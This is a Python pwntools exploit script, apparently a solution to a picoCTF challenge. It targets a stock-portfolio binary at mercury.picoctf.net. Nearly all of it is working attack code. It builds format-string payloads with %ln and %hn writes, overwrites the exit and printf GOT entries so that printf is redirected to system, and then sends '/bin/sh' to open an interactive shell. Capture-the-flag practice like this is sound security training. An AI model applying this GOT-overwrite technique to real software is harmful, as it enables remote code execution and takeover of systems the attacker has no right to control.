#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 58503 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 38163)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)

    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal=['tmux','splitw','-h']
gdbscript = '''
set follow-fork-mode parent
b*0x00400ac9
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil("portfolio\n")
io.sendline("1")

system = 0x004006f0
free = 0x00602018
printf = 0x00602038
exit = 0x00602068
main = 0x00400b95

got = exit
target = main

testStr = ""
testStr += "%.0s" * 10
testStr += "%{}x".format(printf)
testStr += "%12$lln"
testStr += "%.0s" * 1

formatStr = ""
written = 0

formatStr += "%16x" * 10
written += 16 * 10

formatStr += "%{}x".format(got - written)
formatStr += "%ln"
written = got

formatStr += "%16x" * 6
written += 16 * 6

formatStr += "%{}x".format(((target % 0x10000) - (written % 0x10000)) % 0x10000)

#formatStr += "---%p"
formatStr += "%hn"

print(formatStr)

pause()

io.recvuntil("token?\n")
#io.sendline('%12$p')
#io.sendline(testStr)
io.sendline(formatStr)

# print(io.recvuntil("portfolio\n").decode())



def buildStack(addr):
    formatStr = ""
    written = 0

    formatStr += "%16x" * 10
    written += 16 * 10
    formatStr += "%{}x".format(addr - written)
    formatStr += "%ln"

    io.recvuntil("portfolio\n")
    io.sendline("1")
    io.recvuntil("token?\n")
    io.sendline(formatStr)


buildStack(printf)
buildStack(printf + 2)
buildStack(printf + 4)
buildStack(printf + 6)


formatStr = ""
written = 0

formatStr += "%28$hn"
formatStr += "%36$hn"
formatStr += "%{}x".format(0x40)
formatStr += "%44$hn"
formatStr += "%{}x".format(0x6f0 - 0x40)
formatStr += "%52$hn"

io.recvuntil("portfolio\n")
io.sendline("1")
io.recvuntil("token?\n")
io.sendline(formatStr)

io.recvuntil("portfolio\n")
io.sendline("1")
io.recvuntil("token?\n")
io.sendline("/bin/sh")
io.interactive()

